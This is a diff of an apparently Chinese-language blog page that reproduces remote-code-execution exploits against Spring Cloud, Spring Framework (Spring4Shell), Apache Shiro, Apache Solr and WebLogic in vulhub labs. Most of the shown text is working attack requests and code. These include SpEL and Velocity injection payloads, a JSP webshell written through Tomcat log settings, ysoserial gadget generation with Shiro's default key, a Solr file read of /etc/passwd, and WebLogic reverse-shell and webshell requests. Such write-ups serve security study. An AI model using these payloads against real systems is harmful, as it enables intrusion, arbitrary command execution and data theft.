 Connection: close
 Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 0</code></pre>
+Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>发送如下数据包即可查看执行结果：</p>
-<pre class="language-none"><code class="language-none">GET &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -557,21 +557,21 @@ Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36
 Connection: close
 Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 0</code></pre>
+Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="3">
 <li>最后，发送如下数据包清理现场，删除所添加的路由</li>
 </ol>
-<pre class="language-none"><code class="language-none">DELETE &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">DELETE &#x2F;actuator&#x2F;gateway&#x2F;routes&#x2F;hacktest HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
 Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36
-Connection: close</code></pre>
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>再刷新下路由：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;actuator&#x2F;gateway&#x2F;refresh HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;actuator&#x2F;gateway&#x2F;refresh HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -579,14 +579,14 @@ Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36
 Connection: close
 Content-Type: application&#x2F;x-www-form-urlencoded
-Content-Length: 0</code></pre>
+Content-Length: 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="5-Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）"><a href="#5-Spring-Cloud-Function-SpEL表达式命令注入（CVE-2022-22963）" class="headerlink" title="5. Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）"></a>5. Spring Cloud Function SpEL表达式命令注入（CVE-2022-22963）</h3><p><strong>漏洞描述</strong></p>
 <p>Spring Cloud Function是基于 Spring Boot 的函数框架。由于 Spring Cloud Function 对用户输入的参数安全处理不严，未授权的攻击者可构造特定的数据包，通过特定的 HTTP 请求头进行 SpEL 表达式注入攻击，从而可执行任意的恶意 Java 代码，获取服务权限</p>
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub启动一个使用Spring Cloud Function 3.2.2编写的服务器：服务启动后，执行curl <a target="_blank" rel="noopener" href="http://your-ip:8080/uppercase">http://your-ip:8080/uppercase</a> -H “Content-Type: text&#x2F;plain” –data-binary test即可执行uppercase函数，将输入字符串转换成大写</p>
 <p>发送如下数据包，spring.cloud.function.routing-expression头中包含的SpEL表达式将会被执行：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;functionRouter HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;functionRouter HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -597,14 +597,14 @@ spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec
 Content-Type: text&#x2F;plain
 Content-Length: 4
 
-test</code></pre>
+test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="6-Spring-Framework-JDK-gt-x3D-9-RCE（CVE-2022-22965）"><a href="#6-Spring-Framework-JDK-gt-x3D-9-RCE（CVE-2022-22965）" class="headerlink" title="6. Spring Framework JDK &gt;&#x3D; 9 RCE（CVE-2022-22965）"></a>6. Spring Framework JDK &gt;&#x3D; 9 RCE（CVE-2022-22965）</h3><p>在JDK 9+上运行的Spring MVC或Spring WebFlux应用程序可能存在通过数据绑定执行远程代码（RCE）的漏洞。已知的利用方法要求应用程序以WAR部署的形式在Tomcat上运行</p>
 <p><strong>漏洞环境</strong></p>
 <p>使用vulhub启动一个Spring WebMVC 5.3.17服务：服务启动后，访问<code>http://your-ip:8080/?name=Bob&amp;age=25</code>可看到一个演示页面</p>
 <p><strong>漏洞利用</strong></p>
 <p>发送如下数据包，即可修改目标的Tomcat日志路径与后缀，利用这个方法写入一个JSP文件：</p>
-<pre class="language-none"><code class="language-none">GET &#x2F;?class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D;%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix&#x3D;.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix&#x3D;tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D; HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;?class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D;%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix&#x3D;.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix&#x3D;tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D; HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -614,19 +614,19 @@ Connection: close
 suffix: %&gt;&#x2F;&#x2F;
 c1: Runtime
 c2: &lt;%
-DNT: 1</code></pre>
+DNT: 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后，访问刚写入的JSP Webshell，执行任意命令：</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:8080&#x2F;tomcatwar.jsp?pwd&#x3D;j&amp;cmd&#x3D;whoami</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;localhost:8080&#x2F;tomcatwar.jsp?pwd&#x3D;j&amp;cmd&#x3D;whoami<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>在利用完成后将class.module.classLoader.resources.context.parent.pipeline.first.pattern清空，否则每次请求都会写入新的恶意代码在JSP Webshell中，导致这个文件变得很大。发送如下数据包将其设置为空：</p>
-<pre class="language-none"><code class="language-none">GET &#x2F;?class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D; HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">GET &#x2F;?class.module.classLoader.resources.context.parent.pipeline.first.pattern&#x3D; HTTP&#x2F;1.1
 Host: localhost:8080
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
 Accept-Language: en
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;97.0.4692.71 Safari&#x2F;537.36
-Connection: close</code></pre>
+Connection: close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><ul>
 <li><a target="_blank" rel="noopener" href="https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/">https://www.lunasec.io/docs/blog/spring-rce-vulnerabilities/</a></li>
@@ -642,10 +642,10 @@ Connection: close</code></pre>
 <p><strong>漏洞利用</strong></p>
 <p>使用vulhub启动一个使用了Apache Shiro 1.2.4的Web服务：服务启动后，访问<a href="http://your-ip:8080可使用admin:vulhub进行登录">http://your-ip:8080可使用admin:vulhub进行登录</a></p>
 <p>使用ysoserial生成CommonsBeanutils1的Gadget：</p>
-<pre class="language-none"><code class="language-none">java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; poc.ser</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial-master-30099844c6-1.jar CommonsBeanutils1 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; poc.ser<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>使用Shiro内置的默认密钥对Payload进行加密：</p>
-<pre class="language-none"><code class="language-none">package org.vulhub.shirodemo;
+<pre class="line-numbers language-none"><code class="language-none">package org.vulhub.shirodemo;
 
 import org.apache.shiro.crypto.AesCipherService;
 import org.apache.shiro.codec.CodecSupport;
@@ -667,7 +667,7 @@ public class TestRemember &#123;
         ByteSource ciphertext &#x3D; aes.encrypt(payloads, key);
         System.out.printf(ciphertext.toString());
     &#125;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>发送rememberMe Cookie，即可成功执行touch &#x2F;tmp&#x2F;success</p>
 <h3 id="2-Apache-Shiro-Padding-Oracle-RCE（CVE-2019-12422）"><a href="#2-Apache-Shiro-Padding-Oracle-RCE（CVE-2019-12422）" class="headerlink" title="2. Apache Shiro Padding Oracle RCE（CVE-2019-12422）"></a>2. Apache Shiro Padding Oracle RCE（CVE-2019-12422）</h3><p><strong>漏洞描述</strong></p>
@@ -675,11 +675,11 @@ public class TestRemember &#123;
 <p><strong>漏洞利用</strong></p>
 <p>1）登录Shiro网站，从cookie中获得rememberMe字段的值</p>
 <p>2）利用DNSlog探测，通过ysoserial工具生成payload</p>
-<pre class="language-none"><code class="language-none">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping name.ceye.cn&quot; &gt; payload.class</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;ping name.ceye.cn&quot; &gt; payload.class<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>3）使用rememberMe值作为prefix，加载Payload，进行Padding Oracle攻击</p>
 <p>利用工具：<a target="_blank" rel="noopener" href="https://github.com/longofo/PaddingOracleAttack-Shiro-721">PaddingOracleAttack-Shiro-721</a></p>
-<pre class="language-none"><code class="language-none">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">java -jar PaddingOracleAttack.jar targetUrl rememberMeCookie blockSize payloadFilePath<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>爆破成功，输出Result</p>
 <p>4）使用构造的rememberMe攻击字符串重新请求网站</p>
@@ -689,14 +689,14 @@ public class TestRemember &#123;
 <p><strong>环境搭建</strong></p>
 <p>使用vlhub搭建环境，启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：环境启动后，访问<code>http://your-ip:8080</code>即可查看首页</p>
 <p>这个应用中对URL权限的配置如下：</p>
-<pre class="language-none"><code class="language-none">@Bean
+<pre class="line-numbers language-none"><code class="language-none">@Bean
 public ShiroFilterChainDefinition shiroFilterChainDefinition() &#123;
     DefaultShiroFilterChainDefinition chainDefinition &#x3D; new DefaultShiroFilterChainDefinition();
     chainDefinition.addPathDefinition(&quot;&#x2F;login.html&quot;, &quot;authc&quot;); &#x2F;&#x2F; need to accept POSTs from the login form
     chainDefinition.addPathDefinition(&quot;&#x2F;logout&quot;, &quot;logout&quot;);
     chainDefinition.addPathDefinition(&quot;&#x2F;admin&#x2F;**&quot;, &quot;authc&quot;);
     return chainDefinition;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>漏洞复现</strong></p>
 <p>直接请求管理页面&#x2F;admin&#x2F;，无法访问，将会被重定向到登录页面</p>
@@ -721,7 +721,7 @@ public ShiroFilterChainDefinition shiroFilterChainDefinition() &#123;
 <p><strong>漏洞利用</strong></p>
 <p>通过vulhub搭建环境，执行成功后，访问<a target="_blank" rel="noopener" href="http://your-ip:8983/">http://your-ip:8983/</a> 即可查看到Apache solr的管理页面，无需登录</p>
 <p>1）首先创建一个listener，其中设置exe的值为我们想执行的命令，args的值是命令参数：</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1
 Host: your-ip
 Accept: *&#x2F;*
 Accept-Language: en
@@ -729,12 +729,12 @@ User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; 
 Connection: close
 Content-Length: 158
 
-&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;&#x2F;bin&#x2F;&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch &#x2F;tmp&#x2F;success&quot;]&#125;&#125;</code></pre>
+&#123;&quot;add-listener&quot;:&#123;&quot;event&quot;:&quot;postCommit&quot;,&quot;name&quot;:&quot;newlistener&quot;,&quot;class&quot;:&quot;solr.RunExecutableListener&quot;,&quot;exe&quot;:&quot;sh&quot;,&quot;dir&quot;:&quot;&#x2F;bin&#x2F;&quot;,&quot;args&quot;:[&quot;-c&quot;, &quot;touch &#x2F;tmp&#x2F;success&quot;]&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <ol start="2">
 <li>然后进行update操作，触发刚才添加的listener，成功执行命令</li>
 </ol>
-<pre class="language-none"><code class="language-none">POST &#x2F;solr&#x2F;demo&#x2F;update HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;demo&#x2F;update HTTP&#x2F;1.1
 Host: your-ip
 Accept: *&#x2F;*
 Accept-Language: en
@@ -743,7 +743,7 @@ Connection: close
 Content-Type: application&#x2F;json
 Content-Length: 15
 
-[&#123;&quot;id&quot;:&quot;test&quot;&#125;]</code></pre>
+[&#123;&quot;id&quot;:&quot;test&quot;&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -753,13 +753,13 @@ Content-Length: 15
 <h3 id="2-Apache-Solr-DataImport-Handler-命令执行漏洞（CVE-2019-0193）"><a href="#2-Apache-Solr-DataImport-Handler-命令执行漏洞（CVE-2019-0193）" class="headerlink" title="2. Apache Solr DataImport Handler 命令执行漏洞（CVE-2019-0193）"></a>2. Apache Solr DataImport Handler 命令执行漏洞（CVE-2019-0193）</h3><p><strong>漏洞描述</strong></p>
 <p>在Apache Solr中，DataImportHandler是一个可选但常用的模块，用于从数据库和其他源中提取数据，它具有一个功能，其中整个DIH配置可以来自请求的“dataConfig”参数。 DIH管理界面的调试模式使用它来方便调试&#x2F;开发DIH配置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。从Solr的8.2.0版开始，使用此参数需要将Java System属性“enable.dih.dataConfigParam”设置为true</p>
 <p><strong>漏洞环境</strong></p>
-<pre class="language-none"><code class="language-none">docker-compose up -d
-docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">docker-compose up -d
+docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;example-DIH&#x2F;solr&#x2F;db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>命令执行成功后，访问<code>http://your-ip:8983/</code>即可查看到Apache solr的管理页面，无需登录</p>
 <p><strong>漏洞利用</strong></p>
 <p>1）首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC</p>
-<pre class="language-none"><code class="language-none">&lt;dataConfig&gt;
+<pre class="line-numbers language-none"><code class="language-none">&lt;dataConfig&gt;
   &lt;dataSource type&#x3D;&quot;URLDataSource&quot;&#x2F;&gt;
   &lt;script&gt;&lt;![CDATA[
           function poc()&#123; java.lang.Runtime.getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;);
@@ -772,10 +772,10 @@ docker-compose exec solr bash bin&#x2F;solr create_core -c test -d example&#x2F;
             forEach&#x3D;&quot;&#x2F;feed&quot;
             transformer&#x3D;&quot;script:poc&quot; &#x2F;&gt;
   &lt;&#x2F;document&gt;
-&lt;&#x2F;dataConfig&gt;</code></pre>
+&lt;&#x2F;dataConfig&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>2）点击Execute with this Confuguration会发送以下请求包，成功执行命令</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;dataimport?_&#x3D;1565835261600&amp;indent&#x3D;on&amp;wt&#x3D;json HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;test&#x2F;dataimport?_&#x3D;1565835261600&amp;indent&#x3D;on&amp;wt&#x3D;json HTTP&#x2F;1.1
 Host: localhost:8983
 User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0
 Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*
@@ -788,7 +788,7 @@ Connection: close
 Referer: http:&#x2F;&#x2F;localhost:8983&#x2F;solr&#x2F;
 Cookie: csrftoken&#x3D;gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid&#x3D;snzojzqa5zn187oghf06z6xodulpohpr
 
-command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;test&amp;dataConfig&#x3D;%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name&#x3D;dataimport</code></pre>
+command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;test&amp;dataConfig&#x3D;%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name&#x3D;dataimport<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>refer: </p>
 <ul>
@@ -800,10 +800,10 @@ command&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub启动一个Apache Solr 8.2.0服务器：服务启动后，访问<code>http://your-ip:8983</code>即可查看到一个无需权限的Apache Solr服务</p>
 <p>默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。先通过如下API获取所有的核心：</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>通过如下请求开启params.resource.loader.enabled，其中API路径包含刚才获取的core名称</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1
 Host: solr:8983
 Content-Type: application&#x2F;json
 Content-Length: 259
@@ -817,10 +817,10 @@ Content-Length: 259
     &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;,
     &quot;params.resource.loader.enabled&quot;: &quot;true&quot;
   &#125;
-&#125;</code></pre>
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>注入Velocity模板即可执行任意命令：</p>
-<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>refer: </p>
 <ul>
@@ -834,12 +834,12 @@ Content-Length: 259
 <p>使用vulhub搭建环境，执行如下命令启动solr 8.8.1：环境启动后，访问<code>http://your-ip:8983</code>即可查看Apache Solr后台</p>
 <p>1）首先，访问<code>http://your-ip:8983/solr/admin/cores?indexInfo=false&amp;wt=json</code>获取数据库名</p>
 <p>2）发送如下数据包，修改数据库demo的配置，开启RemoteStreaming</p>
-<pre class="language-none"><code class="language-none">curl -i -s -k -X $&#39;POST&#39; \
+<pre class="line-numbers language-none"><code class="language-none">curl -i -s -k -X $&#39;POST&#39; \
     -H $&#39;Content-Type: application&#x2F;json&#39; --data-binary $&#39;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#39; \
-    $&#39;http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;demo&#x2F;config&#39;</code></pre>
+    $&#39;http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;demo&#x2F;config&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>3）再通过stream.url读取任意文件：</p>
-<pre class="language-none"><code class="language-none">curl -i -s -k &#39;http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;demo&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&amp;stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;</code></pre>
+<pre class="line-numbers language-none"><code class="language-none">curl -i -s -k &#39;http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;demo&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams&amp;stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>refer:</p>
 <ul>
@@ -851,7 +851,7 @@ Content-Length: 259
 <p><strong>漏洞复现</strong></p>
 <p>使用vulhub搭建环境，访问<code>http://your-ip:7001/</code>即可看到一个404页面，说明weblogic已成功启动</p>
 <p>发送如下数据包(注意其中反弹shell的语句，需要进行编码)，可反弹shell:</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1
 Host: your-ip:7001
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -881,10 +881,10 @@ Content-Length: 633
 &lt;&#x2F;work:WorkContext&gt;
 &lt;&#x2F;soapenv:Header&gt;
 &lt;soapenv:Body&#x2F;&gt;
-&lt;&#x2F;soapenv:Envelope&gt;</code></pre>
+&lt;&#x2F;soapenv:Envelope&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>写入webshell（访问：<a target="_blank" rel="noopener" href="http://your-ip:7001/bea_wls_internal/test.jsp%EF%BC%89">http://your-ip:7001/bea_wls_internal/test.jsp）</a>:</p>
-<pre class="language-none"><code class="language-none">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1
+<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1
 Host: your-ip:7001
 Accept-Encoding: gzip, deflate
 Accept: *&#x2F;*
@@ -911,7 +911,7 @@ Content-Length: 638
     &lt;&#x2F;work:WorkContext&gt;
     &lt;&#x2F;soapenv:Header&gt;
     &lt;soapenv:Body&#x2F;&gt;
-&lt;&#x2F;soapenv:Envelope&gt;</code></pre>
